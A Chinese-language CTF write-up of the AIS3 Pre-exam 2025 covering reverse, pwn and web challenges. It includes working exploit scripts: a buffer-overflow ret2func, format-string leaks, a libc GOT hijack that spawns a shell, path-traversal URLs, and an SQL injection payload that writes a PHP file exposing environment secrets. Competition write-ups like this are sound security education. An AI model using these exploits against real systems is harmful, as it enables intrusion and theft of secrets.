---
title: "AIS3 Pre-exam 2025 writeup"
date: 2025-05-24
draft: false
tags: ["CTF", "AIS3", "writeup", "pwn", "reverse", "web", "misc", "2025", "competition"]
categories: ["CTF", "Competition Writeup"]
author: "YJK"
showToc: true
TocOpen: false
---

![比賽結果](https://hackmd.io/_uploads/ByQ_D-NGee.png)

author：`YJK`
ID：`YJK`

## Misc

### Welcome

![image](https://hackmd.io/_uploads/BJNwOZNMll.png)

flag: `AIS3{Welcome_And_Enjoy_The_CTF_!}`

免費 flag，但要自己輸入，不要 ctrl c+ctrl v，會拿到 fake flag

### Ramen CTF

![image](https://hackmd.io/_uploads/BydAY7NMlx.png)

flag: `AIS3{樂山溫泉拉麵:蝦拉麵}`

圖片右邊有一張發票條碼沒有被擋

![chal](https://hackmd.io/_uploads/ryw8574feg.jpg)

![2025-05-24 11 18 21](https://hackmd.io/_uploads/r1zwc7EGel.png)

掃描之後發現應該是蝦拉麵，發票上店家是平和溫泉拉麵店

![image](https://hackmd.io/_uploads/HJp0jXEMxl.png)
![image](https://hackmd.io/_uploads/rJYk3XNGxl.png)

google 之後發現地址是 `宜蘭縣礁溪鄉德陽村礁溪路五段108巷1號`

![image](https://hackmd.io/_uploads/Sk9NhQEMlx.png)

此地址在 google map 上是 `樂山溫泉拉麵`

![image](https://hackmd.io/_uploads/HyPu2XNfxx.png)

### AIS3 Tiny Server - Web / Misc

![image](https://hackmd.io/_uploads/H1CSaXNGeg.png)

flag: `AIS3{tInY_we8_53RV3R_WItH_FIle_8R0Ws1n9_@s_@_Fe@TuRe}`

雖然題目敘述說建議 local 先解解看，~~但我直接開 instance~~，

點進去會發現是題目簡介網頁，並發現網址給了 index.html

![image](https://hackmd.io/_uploads/S1DbCmEfxx.png)

另外題目有給小提示，專注在第一個提示就好

![image](https://hackmd.io/_uploads/r1YNCXEMlx.png)

因為前面 index.html 的因素，直接訪問 http://chals1.ais3.org:20148/ ，會發現是個 file server 的感覺

![image](https://hackmd.io/_uploads/Hyh5CX4Mxx.png)

不過這可能只是當初開 file server 指定的目錄，而不是機器的 root 目錄，嘗試透過 http://chals1.ais3.org:20148// ，跳脫上去試試看，發現應該是 root 目錄，直接訪問檔案

![image](https://hackmd.io/_uploads/HkgZy4EMxe.png)

![image](https://hackmd.io/_uploads/r1381EEfxl.png)


## Reverse

### web flag checker

![image](https://hackmd.io/_uploads/ry6lxNEfxe.png)

flag: `AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`

頁面是 flag checker

![image](https://hackmd.io/_uploads/H1julNEzlg.png)

f12 後發現有 index.js 和 index.wasm

![image](https://hackmd.io/_uploads/HJUigNEzeg.png)

推測應該是要考 wasm，所以載下來看，那這邊有關於 wasm 的 toolkit
https://github.com/WebAssembly/wabt ，我是使用 wasm2c 先轉回去可讀性相對高的 c code

直接看轉回來的 c code 會發現有個 flag checker 的 function，直接看那個 function

![image](https://hackmd.io/_uploads/rJUVMNNzge.png)

decompile 後程式碼有點長，這邊就不全部貼上來了

![image](https://hackmd.io/_uploads/H1DtMV4zgl.png)

分析完之後發現應該是把 flag 分成 5 段並且跟某個值去做相對應位數的 rotate，後面是給 AI 去寫 script 的，整理之後 script 如下：

```python
import struct
def rotr64(value, amount):
    amount &= 63
    return ((value >> amount) | (value << (64 - amount))) & 0xFFFFFFFFFFFFFFFF
def solve():
    targets = [
        7577352992956835434,
        7148661717033493303,
        11365297244963462525,
        10967302686822111791,
        8046961146294847270
    ]
    magic = 4255033133
    flag = ""
    for i in range(5):
        shift = (magic >> (i * 6)) & 0x3F
        original = rotr64(targets[i], shift)
        block = struct.pack('<Q', original).decode('ascii', errors='replace')
        flag += block
    flag = flag.rstrip('\x00')
    return flag
if __name__ == "__main__":
    result = solve()
    print(f"Flag: {result}") 
```

### AIS3 Tiny Server - Reverse

![image](https://hackmd.io/_uploads/S1BWr4Vfxx.png)

flag: `AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}`

把檔案載下來丟 ida 之後發現 function 很少就 function 點一點，發現有個可疑的 function

![image](https://hackmd.io/_uploads/SkQrO4NMgx.png)

後面也沒什麼逆邏輯，就直接把 v8 那邊轉一轉然後去跟 `rikki_l0v3` 做 xor 就有 flag 了，script 如下

```python
from pwn import xor
v8 = [
    1480073267, 1197221906, 254628393, 920154, 1343445007,
    874076697, 1127428440, 1510228243, 743978009, 54940467, 1246382110
]
s = b"".join(i.to_bytes(4, 'little') for i in v8)
key = b"rikki_l0v3"
result = xor(s, key)
print(result.decode('utf-8', errors='ignore'))
```

### A_simple_snake_game

![image](https://hackmd.io/_uploads/SkEm9SNflg.png)

flag: `AIS3{CH3aT_Eng1n3?_0fcau53_I_bo_1T_by_hAnD}`

簡單的貪食蛇遊戲

![image](https://hackmd.io/_uploads/r1prcBEfex.png)

直接丟 ida 看一下，並且感覺這種題目應該是分數到了會噴 flag，所以直接看 function 有個 `SnakeGame::Screen::drawText`，可能是輸出文字的，感覺有個可疑的數值跟一些在做 xor 的操作

![image](https://hackmd.io/_uploads/BJKHjH4fxe.png)

就直接把數值跟他 xor 的部分拉出來做一次就發現是 flag，script 如下

```python
hex_array1 = [
    0xC0, 0x19, 0x3A, 0xFD, 0xCE, 0x68, 0xDC, 0xF2, 0x0C, 0x47,
    0xD4, 0x86, 0xAB, 0x57, 0x39, 0xB5, 0x3A, 0x8D, 0x13, 0x47,
    0x3F, 0x7F, 0x71, 0x98, 0x6D, 0x13, 0xB4, 0x01, 0x90, 0x9C,
    0x46, 0x3A, 0xC6, 0x33, 0xC2, 0x7F, 0xDD, 0x71, 0x78, 0x9F,
    0x93, 0x22, 0x55, 0x15
]
print(len(hex_array1))
v14 = [-831958911, -1047254091, -1014295699, -620220219,
       2001515017, -317711271, 1223368792, 1697251023,
       496855031, -569364828, 26365]
encoded_bytes = b"".join(int(x).to_bytes(4, byteorder='little', signed=True) for x in v14)
encoded_string = encoded_bytes[:44]
decoded_string = ''.join(chr(encoded_string[i] ^ hex_array1[i]) for i in range(len(encoded_string)))
print("FLAG: ", decoded_string)
```

## PWN

### Welcome to the World of Ave Mujica🌙

![image](https://hackmd.io/_uploads/HJNe3H4zgg.png)

flag: `AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._17a08e4f063f52a071ed1d36efcbf205}`

檔案載下來丟 ida 然後會發現一開始先輸入 yes 會進下一個 stage，然後接下來會用 `read_int8()` 讀入數字並且將數字直接當作後續 read buffer 的長度

![image](https://hackmd.io/_uploads/Hk-gyLEGxl.png)

接下來看一下 `read_int8()`，會發現會用 atoi() 把字串轉數字，接下來確認是否 <= 127，再來使用 unsigned int 強制轉型回去正數，因此如果輸入負數即可繞過 <= 127 的檢查並且得到一個很大的數字，也代表可以讓 overflow 的空間變大

![image](https://hackmd.io/_uploads/Hy-brUNzlg.png)

另外還有一個 function 是可以開 shell

![image](https://hackmd.io/_uploads/ByI6BUVGgl.png)

確認一下保護機制，沒開 PIE、沒有 canary，所以可以直接 ret2func 開 shell

![image](https://hackmd.io/_uploads/B1a1II4fgg.png)

script 如下

```python
from pwn import *
r = process("./chal")
r = remote("chals1.ais3.org", 60143)
r.sendline(b"yes")
r.sendline(b"-1")
payload = b"A" * (0xa0 + 0x8) + p64(0x401256)
sleep(1)
r.sendline(payload)
r.interactive()
```

### Format Number

![image](https://hackmd.io/_uploads/rJCULLEfxl.png)

flag: `AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}`

source code:

```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include <string.h>


void check_format(char *format) {
    for (int i = 0; format[i] != '\0'; i++) {
        char c = format[i];
        if (c == '\n') {
            format[i] = '\0';
            return;
        }
        if (!isdigit(c) && !ispunct(c)) {
            printf("Error format !\n");
            exit(1);
        }
    }
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    srand(time(NULL));
    int number = rand();
    int fd = open("/home/chal/flag.txt", O_RDONLY);
    char flag[0x100] = {0};
    read(fd, flag, 0xff);
    close(fd);

    char format[0x10] = {0};
    printf("What format do you want ? ");
    read(0, format, 0xf);
    check_format(format);

    char buffer[0x20] = {0};
    strcpy(buffer, "Format number : %3$");
    strcat(buffer, format);
    strcat(buffer, "d\n");
    printf(buffer, "Welcome", "~~~", number);

    return 0;
}
```

在第 43 行有 fmt 的問題，然後第 40~42 會發現可以控制 `%3$`、`d`，中間的字串，但會檢查是否是數字或是符號，因此不能直接改變 type，並且要跳脫出 `%3$` 的部分，不然會一直控不了參數，我這邊使用 `%3$2-` 直接跳脫出去，後面可以隨意指定第幾個值，接下來就是暴力找出 flag 所在的 index 值然後再轉回去字元就可以了，經過測試會在 20~59，script 如下

```python
from pwn import *
flag = ""
for i in range(20,59,1):
    r = remote('chals1.ais3.org', 50960)
    payload = f"%3$2-%{i}$"
    r.sendlineafter(b'? ', payload.encode())
    num = r.recvline().strip().split(b'%3$2-')[-1]
    flag += chr(int(num.decode()))
    r.close()
print(flag)
```

### MyGO schedule manager α (賽後解出)

![image](https://hackmd.io/_uploads/rkpSfqNzgg.png)

flag: `AIS3{MyGO!!!!!T0m0rin_1s_cut3@u_a2r_mAsr3r_0f_CP1usp1us_string_a2d_0verf10w!_alpha_v3r2on_have_br0ken...Go_p1ay_b3ta!}`

source code

```cpp
#include <iostream>
#include <vector>
#include <string>
#include <cstring> 
#include <cstdlib>

// g++ chal.cpp -o chal -no-pie -z relro -z now -s

struct schedule{
    char title[0x16];
    std::string content;
};

int SCHEDULE_STATUS = 0;
schedule* sched = nullptr;

void init_proc(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    std::cin.rdbuf()->pubsetbuf(nullptr, 0);
    std::cout.rdbuf()->pubsetbuf(nullptr, 0);
    
    puts("+======= alpha ========+");
    puts("| Band schedule system |");
    puts("+======================+");
    
}

void debug_backdoor(){
    system("/bin/sh");
}

void menu(){
    puts("+======================+");
    puts("| (1) create schedule  |");
    puts("| (2) edit title       |");
    puts("| (3) edit content     |");
    puts("| (4) show schedule    |");
    puts("+======================+");
    printf("< MyGO @ ScheduleManager $ > ");
}

int get_choice(){
    int choice;
    scanf("%d", &choice);
    return choice;
}

void create(){
    if(SCHEDULE_STATUS == 0){
        sched = new(std::nothrow) schedule;
        if (sched == nullptr) {
            puts("[x] Memory allocation failed!");
            exit(0);
        }
        
        puts("MyGO @ sched title > ");
        std::cin >> sched->title;
        puts("MyGO @ sched content > ");
        std::cin >> sched->content;
        
        SCHEDULE_STATUS = 1;

        puts("[!] Create Success !!!");
    } else {
        puts("[x] Your schedule have been created");
        return;
    }
}

void edit_title(){
    if (SCHEDULE_STATUS == 1){
        puts("MyGO @ sched title > ");
        std::cin >> sched->title;
        puts("[!] Edit Success");
    } else {
        puts("[x] Schdule Not Found ... ");
        return;
    } 
}

void edit_content(){
    if (SCHEDULE_STATUS == 1){
        puts("MyGO @ sched content > ");
        std::cin >> sched->content;
        puts("[!] Edit Success");
    } else {
        puts("[x] Schdule Not Found ... ");
        return;
    } 
}

void show(){
    if (SCHEDULE_STATUS == 1){
        printf("===== Schedule =====\n");
        printf("MyGO @ Title : %15s\n", sched -> title);
        printf("MyGO @ Content : %s\n", sched -> content.c_str());
        printf("====================\n");
    } else {
        puts("[x] Schdule Not Found ... ");
        return;
    }
}

void login(){
    char username[0x10];  
    char password[0x10]; 
    
    printf("Username > ");
    scanf("%15s", username);

    printf("Password > ");
    scanf("%15s", password);
    
    if (strcmp(username, "MyGO!!!!!") == 0 && strcmp(password, "TomorinIsCute") == 0){
        puts("\033[34m");
        puts("=========================================");
        puts("                  ____    _____      ");  
        puts(" /'\\_/`\\         /\\  _`\\ /\\  __`\\    ");  
        puts("/\\      \\  __  __\\ \\ \\L\\_\\ \\ \\/\\ \\   ");  
        puts("\\ \\ \\__\\ \\/\\ \\/\\ \\\\ \\ \\L_L\\ \\ \\ \\ \\  ");  
        puts(" \\ \\ \\_/\\ \\ \\ \\_\\ \\\\ \\ \\/, \\ \\ \\_\\ \\ ");  
        puts("  \\ \\_\\\\ \\_\\/`____ \\\\ \\____/\\ \\_____\\");  
        puts("   \\/_/ \\/_/`/___/> \\\\/___/  \\/_____/");  
        puts("               /\\___/                 ");  
        puts("               \\/__/                  ");  
        puts("=========================================");
        puts("\033[0m");
        puts("[!] This is a system that can manage your band schedule.");
        return;
    } else {
        puts("[x] Verify Failed");
        exit(0);
    }
}

int main()
{
    init_proc();
    
    int choice;
    int index;
    
    login();
    
    while(1){
        menu();
        choice = get_choice();
        if (choice == 1){
            create();
        } else if (choice == 2){
            edit_title();
        } else if (choice == 3){
            edit_content();
        } else if (choice == 4){
            show();
        } else {
            break;
        }
        
    }
    return 0;
}
```

可以發現是選單題，不過沒有 free，可能可以初步排除 UAF 的問題，接下來有 create、edit title、edit content、show 的功能，另外 create、edit 的部分其實都是用 cin，這部分其實跟 C++ PWN 沒有那麼熟，不過好像 cin 可能會有 overflow 的風險，因此測試看看，會發現程式並沒有 crash 並且成功寫入，但會發現 content 不見了

測試腳本如下

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def create(r, title, content):
    r.sendlineafter('> ', b'1')
    r.sendlineafter('title > ', title)
    r.sendlineafter('content > ', content)

def edit_title(r, title):
    r.sendlineafter('> ', b'2')
    r.sendlineafter('title > ', title)

def edit_content(r, content):
    r.sendlineafter('> ', b'3')
    r.sendlineafter('content > ', content)

def show(r):
    r.sendlineafter('> ', b'4')

def login(r):
    r.sendlineafter('Username > ', b"MyGO!!!!!")
    r.sendlineafter('Password > ', b"TomorinIsCute")

# r = process('./chal')
r = remote('chals1.ais3.org', 51000)
login(r)
create(r, b'a' * 0x16, b'b' * 0x16)
edit_title(r, b'a' * 24)
show(r)
r.interactive()
```

![image](https://hackmd.io/_uploads/ByS_S94Geg.png)

然後後面 ida 之後才發現原來 edit title 可能會覆蓋到 edit content 拿到要寫入的值，並且如果 gdb 進去看結構會發現 0x4042C8 + 24 其實是儲存一個 address，因此我們如果 overflow title 的部分就代表會覆蓋到 address，所以才會導致 show 的時候拿不到值，因為 show 也是使用相同方式拿資料的，這部分就不 gdb 進去 demo 了，而這也代表我們可以將要寫資料的 address 直接透過 overflow title 的部分，接下來 edit content 的時候就會寫到那一塊了，但要注意，要記得 vmmap 看一下那一段是否可寫，不然寫了會 crash

![image](https://hackmd.io/_uploads/Syfg8cVGlx.png)

![image](https://hackmd.io/_uploads/Sy--89EGel.png)

那既然拿到任意寫，究竟要任意寫去哪裡，這時候看到 source code 會發現有個 debug_backdoor 是可以直接開 shell 的，因此我們只要 control flow 到那個 backdoor 就可以了，但會發現 schedule 結構上沒有 function pointer，然後確認一下保護機制會發現 Full RELRO，所以程式上的 got 也不可寫

![image](https://hackmd.io/_uploads/Hk3DvqVGge.png)

這時候就來到最有趣的時候了，我原本以為沒有給 libc 應該是可以不用打 libc，但最後也只有想到 libc 有個 got table 可以寫，最後就結束了，但後面覺得應該只差一點點，所以就乾脆直接把題目架起來，接下來進入 container 把 linker、loader 拉出來做 patchelf，但最後發現有些會 patch 失敗，所以就果斷進去 container 並且把 debug 環境處理好，然後一步一步跟著 debugger 走，會發現跟過去看過的 [Libc-GOT-Hijacking](https://github.com/n132/Libc-GOT-Hijacking)相同，有一個段落會是一堆 ABS 之類的，中間會跳到一段可寫的 got table，基本上我也沒在記哪邊可以寫，但可以好好關注以下圖片的可寫段，或是其他沒有圈起來但是他有 write 權限，如果中間有 jmp 到某段可以寫的，並且那邊看起來是一個 address，就可以嘗試寫寫看，就有機會可以 control flow

![image](https://hackmd.io/_uploads/B1iN594Gxl.png)

那就會發現我們會需要利用 libc，那就需要 leak libc，這時就可以利用 show 的部分，我們可以填入某個 got，那藉由 show 的功能去看 content 就可以察看到某個 libc address，所以只要藉由這樣的方式是就可以去計算 libc 的 base，以下是 leak libc base address 的 script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def create(r, title, content):
    r.sendlineafter('> ', b'1')
    r.sendlineafter('title > ', title)
    r.sendlineafter('content > ', content)

def edit_title(r, title):
    r.sendlineafter('> ', b'2')
    r.sendlineafter('title > ', title)

def edit_content(r, content):
    r.sendlineafter('> ', b'3')
    r.sendlineafter('content > ', content)

def show(r):
    r.sendlineafter('> ', b'4')

def login(r):
    r.sendlineafter('Username > ', b"MyGO!!!!!")
    r.sendlineafter('Password > ', b"TomorinIsCute")

# r = process('./chal')
r = remote('chals1.ais3.org', 51000)
login(r)
put_got = 0x0000000000403fd0
write = 0x321098
win = 0x4013EC
create(r, b'a' * 0x16, b'b' * 0x16)
edit_title(r, b'a' * 24 + p64(put_got))
show(r)
r.recvuntil(b'Content : ')
leak = r.recvuntil(b'\n', drop=True)
addr = u64(leak.ljust(8, b'\x00'))
log.info(f'Leaked address: {hex(addr)}')
libc_base = addr - 0x187e50
log.info(f'Libc base address: {hex(libc_base)}')
r.interactive()
```

![image](https://hackmd.io/_uploads/S1-0c9EGlg.png)

接下來只需要去找可以 control flow 的可寫段，並且把那一段寫成 backdoor function 就可以 control flow 了，而這部分就不多贅述，而我最後是寫到 puts 的 libc got table，因為這樣在寫完之後就可以直接 get shell(寫完之後本來會輸出 Edit Success)，以下是完整 script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def create(r, title, content):
    r.sendlineafter('> ', b'1')
    r.sendlineafter('title > ', title)
    r.sendlineafter('content > ', content)

def edit_title(r, title):
    r.sendlineafter('> ', b'2')
    r.sendlineafter('title > ', title)

def edit_content(r, content):
    r.sendlineafter('> ', b'3')
    r.sendlineafter('content > ', content)

def show(r):
    r.sendlineafter('> ', b'4')

def login(r):
    r.sendlineafter('Username > ', b"MyGO!!!!!")
    r.sendlineafter('Password > ', b"TomorinIsCute")

# r = process('./chal')
r = remote('chals1.ais3.org', 51000)
login(r)
put_got = 0x0000000000403fd0
write = 0x321098
win = 0x4013EC
create(r, b'a' * 0x16, b'b' * 0x16)
edit_title(r, b'a' * 24 + p64(put_got))
show(r)
r.recvuntil(b'Content : ')
leak = r.recvuntil(b'\n', drop=True)
addr = u64(leak.ljust(8, b'\x00'))
log.info(f'Leaked address: {hex(addr)}')
libc_base = addr - 0x187e50
log.info(f'Libc base address: {hex(libc_base)}')
log.info(f'Writable address: {hex(libc_base + write)}')
edit_title(r, b'a' * 24 + p64(libc_base + write))
edit_content(r, p64(win))
r.interactive()
```

## Web

### Tomorin db 🐧

![image](https://hackmd.io/_uploads/SJ_TIpEfee.png)

flag: `AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}`

網頁點進去是一個簡單的 file server

![image](https://hackmd.io/_uploads/HJPUw64zxl.png)


看程式碼發現如果訪問 /flag 會 redirect 到 `https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6`，所以使用 `%2f` 繞過，`http://chals1.ais3.org:30000/%2fflag`

![image](https://hackmd.io/_uploads/H1zuDpEfgg.png)

### Login Screen 1

![image](https://hackmd.io/_uploads/By4nvpNMgx.png)

flag: `AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}`

點進去發現可以用 guest/guest 登入，直接登入

![image](https://hackmd.io/_uploads/ByvgOTNGgx.png)

登入之後需要 2fa，一樣使用 guest 的 2fa

![image](https://hackmd.io/_uploads/SyNfuaVMxl.png)

會發現只有 admin 可以看 flag

![image](https://hackmd.io/_uploads/SkK4dp4zxg.png)

由此可以猜想應該有個 username 是 admin，另外密碼直接猜測弱密碼 admin 之後發現可以登入，但還是需要 2fa，觀察檔案會發現會有一個 users.db 儲存資訊，加上網址感覺可以直接讀檔案，所以直接嘗試 users.db，發現可以成功下載

![image](https://hackmd.io/_uploads/HyYgY6Ezel.png)

讀取 users.db 會發現有個 table 是 users，再看內容會發現應該分別是儲存帳號、密碼、2fa code

![image](https://hackmd.io/_uploads/HJf1qTNfeg.png)

輸入 admin 的 2fa code 即可獲得 flag

![image](https://hackmd.io/_uploads/rJbWq6VGle.png)


### Login Screen 2

![image](https://hackmd.io/_uploads/rkOjcpEzge.png)

flag: `AIS3{2.Nyan_Nyan_File_upload_jWvuUeUyyKU}`

觀察 docker-compose.yml 會發現 flag2 被寫在環境變數，並且觀察其他檔案發現沒有任何頁面嘗試獲取 flag2

```yml
services:
  cms:
    build: ./cms
    ports:
      - "36368:80"
    volumes:
      - ./cms/html/2fa.php:/var/www/html/2fa.php:ro
      - ./cms/html/dashboard.php:/var/www/html/dashboard.php:ro
      - ./cms/html/index.php:/var/www/html/index.php:ro
      - ./cms/html/init.php:/var/www/html/init.php:ro
      - ./cms/html/logout.php:/var/www/html/logout.php:ro
      - ./cms/html/users.db:/var/www/html/users.db:ro
      - ./cms/html/styles.css:/var/www/html/styles.css:ro
    environment:
      - FLAG1=AIS3{1.This_is_the_first_test_flag}
      - FLAG2=AIS3{2.This_is_the_second_test_flag}
```

觀察 index.php 會發現 username 的值會直接被串接進去 SQL 裡面，並且不會事先經過任何處理，所以有 sql injection 風險

![image](https://hackmd.io/_uploads/Bky4oTEzle.png)

所以可以透過這邊去做 sql injection 再 RCE 把 flag 寫在可以造訪的到的檔案，不過這邊因為我沒有到擅長 web 因此 payload 部分是使用 AI 構建的，Login Screen 1、2 解題 script 如下

```py
import requests
import re
import time
BASE_URL = "http://login-screen.ctftime.uk:36368"
def get_flag1():
    print("=== 獲取 FLAG1 ===")
    session = requests.Session()
    print("[+] 訪問首頁...")
    response = session.get(f"{BASE_URL}/")
    print("[+] 使用 admin/admin 登入...")
    login_data = {
        'username': 'admin',
        'password': 'admin'
    }
    response = session.post(f"{BASE_URL}/index.php", data=login_data)
    if "2FA" not in response.text:
        print("[-] 登入失敗")
        return None
    print("[+] 登入成功，重定向到2FA頁面")
    print("[+] 輸入2FA碼...")
    fa_data = {
        'code': '51756447753485459839'
    }
    response = session.post(f"{BASE_URL}/2fa.php", data=fa_data)
    if "Welcome" not in response.text:
        print("[-] 2FA驗證失敗")
        return None
    print("[+] 2FA驗證成功")
    if "AIS3{" in response.text:
        flag_match = re.search(r'AIS3\{[^}]+\}', response.text)
        if flag_match:
            flag1 = flag_match.group(0)
            print(f"[*] FLAG1: {flag1}")
            return flag1
    print("[-] 未找到FLAG1")
    return None
def get_flag():
    print("\n=== 獲取 FLAG2 ===")
    rce_payload = "admin'; ATTACH DATABASE '/var/www/html/flag.php' AS flag; CREATE TABLE flag.content(data BLOB); INSERT INTO flag.content VALUES ('<?php echo \"FLAG2: \" . getenv(\"FLAG2\"); ?>'); --"
    session = requests.Session()
    print("[+] 訪問首頁...")
    response = session.get(f"{BASE_URL}/")
    print("[+] 執行SQL注入payload...")
    print(f"[*] Payload: {rce_payload[:80]}...")
    login_data = {
        'username': rce_payload,
        'password': 'admin'
    }
    response = session.post(f"{BASE_URL}/index.php", data=login_data)
    if "2FA" not in response.text:
        print("[-] SQL注入失敗")
        return None
    print("[+] SQL注入成功，到達2FA頁面")
    print("[+] 執行2FA驗證以觸發SQL執行...")
    fa_data = {'code': '51756447753485459839'}
    fa_response = session.post(f"{BASE_URL}/2fa.php", data=fa_data)
    if "Welcome" not in fa_response.text:
        print("[-] 2FA失敗，但檔案可能已經創建")
    else:
        print("[+] SQL執行成功")
    print("[+] 訪問創建的檔案 /flag.php...")
    time.sleep(1)
    try:
        file_response = requests.get(f"{BASE_URL}/flag.php")
        if file_response.status_code != 200:
            print("[-] 檔案不存在")
            return None
        print(f"[+] 檔案存在，大小: {len(file_response.text)} bytes")
        if "AIS3{" in file_response.text:
            flag_match = re.search(r'(AIS3\{[^}]+\})', file_response.text)
            if flag_match:
                flag = flag_match.group(1)
                print(f"[*] FLAG2: {flag}")
                return flag
        print("[-] 檔案中未找到FLAG2")
        print(f"[*] 檔案內容預覽: {file_response.text[:200]}")
        return None
    except Exception as e:
        print(f"[-] 訪問檔案失敗: {e}")
        return None
def main():
    print("LoginScreen2 CTF Challenge - Complete Exploit")
    print("=" * 50)
    flag1 = get_flag1()
    flag = get_flag()
    print("\n" + "=" * 50)
    print("攻擊結果:")
    if flag1:
        print(f"✅ FLAG1: {flag1}")
    else:
        print("❌ FLAG1: 獲取失敗")

    if flag:
        print(f"✅ FLAG2: {flag}")
    else:
        print("❌ FLAG2: 獲取失敗")
    if flag1 and flag:
        print("\n🎉 兩個FLAG都成功獲取！")
    else:
        print("\n⚠️  部分FLAG獲取失敗")
if __name__ == "__main__":
    main()
```

## Crypto

跟去年相同都沒有碰